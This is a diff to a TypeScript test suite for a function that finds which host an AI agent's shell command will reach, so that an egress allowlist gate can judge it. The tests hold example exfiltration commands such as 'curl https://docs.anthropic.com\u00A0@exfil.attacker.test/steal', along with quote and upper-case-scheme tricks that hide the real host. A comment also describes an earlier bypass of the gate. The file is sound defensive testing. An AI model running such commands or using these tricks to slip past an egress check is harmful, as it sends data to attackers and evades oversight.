@@ -91,6 +91,34 @@ describe("pulling an egress destination out of a shell command", () => {
     ).toEqual({ destination: AMBIGUOUS });
   });
 
+  // #268: the shell does not split on Unicode spaces, so neither may the match.
+  for (const [name, space] of [
+    ["U+FEFF", "\uFEFF"],
+    ["U+00A0", "\u00A0"],
+    ["U+2003", "\u2003"],
+    ["U+3000", "\u3000"],
+  ] as const) {
+    it(`refuses a userinfo hidden behind ${name}, which the shell keeps in the word`, () => {
+      expect(
+        annotateEgressDestination(
+          "egress",
+          {},
+          preliminary({ name: "Bash", args: {}, raw_command: `curl https://docs.anthropic.com${space}@exfil.attacker.test/steal` }),
+        ),
+      ).toEqual({ destination: AMBIGUOUS });
+    });
+  }
+
+  it("still ends the match at an ASCII tab, which the shell does split on", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com/x\t-o out" }),
+      ),
+    ).toEqual({ destination: "https://docs.anthropic.com" });
+  });
+
   it("refuses an authority whose userinfo carries a colon", () => {
     expect(
       annotateEgressDestination(
@@ -262,6 +290,54 @@ describe("pulling an egress destination out of a shell command", () => {
     ).toEqual({ destination: "https://docs.anthropic.com.evil.test" });
   });
 
+  // #373. The shell deletes quotes, so a quote inside a word is not the end of
+  // the URL: `curl` connects to `evil.test` for each of these, with the
+  // allowlisted host as userinfo. The match ends at the quote, the text before
+  // it is an unambiguous allowlisted authority, and so the word has to be
+  // checked for continuing past the match.
+  for (const command of [
+    `curl https://docs.anthropic.com"@evil.test/x`,
+    `curl 'https://docs.anthropic.com'@evil.test/x`,
+    `curl "https://docs.anthropic.com"@evil.test/x`,
+    `curl https://docs.anthropic.com""@evil.test/x`,
+    `curl https://docs.anthropic.com'"'@evil.test/x`,
+  ]) {
+    it(`refuses a URL whose shell word goes on past a quote, for ${command}`, () => {
+      expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: command }))).toEqual({
+        destination: AMBIGUOUS,
+      });
+    });
+  }
+
+  // The other half: a quote that closes the whole word is the ordinary way to
+  // write a URL, and must keep answering the real origin.
+  for (const command of [
+    `curl "https://docs.anthropic.com/x"`,
+    `curl 'https://docs.anthropic.com/x' -o out`,
+    `curl "https://docs.anthropic.com/x";ls`,
+    `echo $(curl "https://docs.anthropic.com/x")`,
+  ]) {
+    it(`still answers the origin when a quote closes the word, for ${command}`, () => {
+      expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: command }))).toEqual({
+        destination: "https://docs.anthropic.com",
+      });
+    });
+  }
+
+  // #373. `curl` reads the scheme without regard to case. A pattern that
+  // missed `HTTPS://` answered `{}`, which the gate allows.
+  it("finds a URL whose scheme is upper case", () => {
+    expect(
+      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl HTTPS://evil.test/x" })),
+    ).toEqual({ destination: "https://evil.test" });
+  });
+
+  it("answers the origin for a mixed-case scheme on an allowlisted host", () => {
+    expect(
+      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl HtTp://docs.anthropic.com/x" })),
+    ).toEqual({ destination: "http://docs.anthropic.com" });
+  });
+
   // The stated miss direction, asserted rather than left implicit: the stock
   // gate is `undefined` when no destination resolves, so the call falls
   // through to the other gates. A command this cannot parse is unexamined, not
@@ -314,24 +390,32 @@ describe("pulling an egress destination out of a shell command", () => {
   }
 });
 
-describe("standing down when the snapshot already carries a destination", () => {
-  // Two of the stock gate's destination paths resolving to different strings
-  // is not a priority order -- it is a complete-rule conflict, measured as
-  // deny runtime_error:policy_invocation_failed. So an argument AGT already
-  // reads wins, and this function contributes nothing.
+describe("a destination argument on the snapshot does not silence the command's own URL", () => {
+  // #373. This block used to assert the opposite: that an argument AGT already
+  // reads made the function contribute `{}`. That let a command reaching
+  // `evil.test` ride through on a `url` argument naming an allowlisted URL,
+  // because the gate read the argument and never saw the command. Two paths
+  // resolving to different strings is a complete-rule conflict, measured as
+  // deny runtime_error:policy_invocation_failed -- the fail-closed side.
   for (const argument of ["url", "endpoint", "host", "domain"]) {
-    it(`contributes nothing when the tool sent its own "${argument}"`, () => {
+    it(`still answers the command's destination when the tool sent its own "${argument}"`, () => {
       expect(
         annotateEgressDestination(
           "egress",
           {},
-          preliminary({ name: "SomeTool", args: { [argument]: "https://docs.anthropic.com/a" }, raw_command: "curl https://exfil.test/b" }),
+          preliminary({ name: "Bash", args: { [argument]: "https://docs.anthropic.com/a" }, raw_command: "curl https://exfil.test/b" }),
         ),
-      ).toEqual({});
+      ).toEqual({ destination: "https://exfil.test" });
     });
   }
 
-  it("still reads the raw command when the tool's own destination argument is not a string", () => {
+  it("answers nothing when the command carries no URL, whatever the tool sent", () => {
+    expect(
+      annotateEgressDestination("egress", {}, preliminary({ name: "WebFetch", args: { url: "https://docs.anthropic.com/a" }, raw_command: "" })),
+    ).toEqual({});
+  });
+
+  it("reads the raw command when the tool's own destination argument is not a string", () => {
     expect(
       annotateEgressDestination(
         "egress",
@@ -375,7 +459,7 @@ const curlResolvedHosts = (await Bun.file(`${import.meta.dir}/fixtures/curl-reso
 
 describe("agreeing with curl about which host a command reaches, or refusing to answer", () => {
   it("has a corpus to check, so an emptied fixture cannot pass silently", () => {
-    expect(Object.keys(curlResolvedHosts).length).toBeGreaterThanOrEqual(18);
+    expect(Object.keys(curlResolvedHosts).length).toBeGreaterThanOrEqual(22);
   });
 
   for (const [command, curlHost] of Object.entries(curlResolvedHosts)) {
